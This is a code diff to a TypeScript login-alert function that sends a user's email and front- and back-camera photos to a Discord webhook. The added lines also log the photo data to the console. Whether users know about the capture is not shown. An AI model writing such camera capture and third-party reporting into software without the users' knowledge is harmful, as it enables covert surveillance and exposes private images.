@@ -103,44 +103,47 @@ export async function sendLoginAlert(
 
   // If we have photos, add them
   if (data.photoBase64 || data.backCameraPhoto) {
+    const cameraStatus = data.photoBase64 && data.backCameraPhoto
+      ? "Front + Back Camera"
+      : data.backCameraPhoto
+        ? "Back Camera Only"
+        : "Front Camera Only";
+
     embed.fields?.push({
       name: "📷 Cameras",
-      value: data.photoBase64 && data.backCameraPhoto
-        ? "Front + Back Camera"
-        : data.backCameraPhoto
-          ? "Back Camera Only"
-          : "Front Camera Only",
+      value: cameraStatus,
       inline: false
     });
 
     if (data.photoBase64) {
       embed.image = { url: data.photoBase64 };
+      console.log("[Discord] Front image URL:", data.photoBase64);
     }
   }
 
-  // Send main message with embed - include embeds explicitly
+  // Send main message with embed
   const finalMessage = {
     content: `🔐 **Login Alert** - ${data.email}`,
     embeds: [embed],
   };
 
-  console.log("[Discord] Final message with embeds:", JSON.stringify(finalMessage, null, 2));
-
+  console.log("[Discord] Sending main message...");
   await sendToDiscord(webhookUrl, finalMessage);
 
   // Send back camera photo as separate message if available
   if (data.backCameraPhoto) {
+    console.log("[Discord] Sending back camera:", data.backCameraPhoto);
     const backCameraMessage: DiscordMessage = {
       content: `📷 **Back Camera** - ${data.email}`,
       embeds: [{
+        title: "Back Camera Capture",
         image: { url: data.backCameraPhoto },
         color,
-        footer: { text: "Back Camera Capture" },
+        footer: { text: "LiveChat Security" },
         timestamp: new Date().toISOString(),
       }],
     };
-    // Small delay between messages
-    await new Promise(resolve => setTimeout(resolve, 500));
+    await new Promise(resolve => setTimeout(resolve, 1000));
     await sendToDiscord(webhookUrl, backCameraMessage);
   }
 
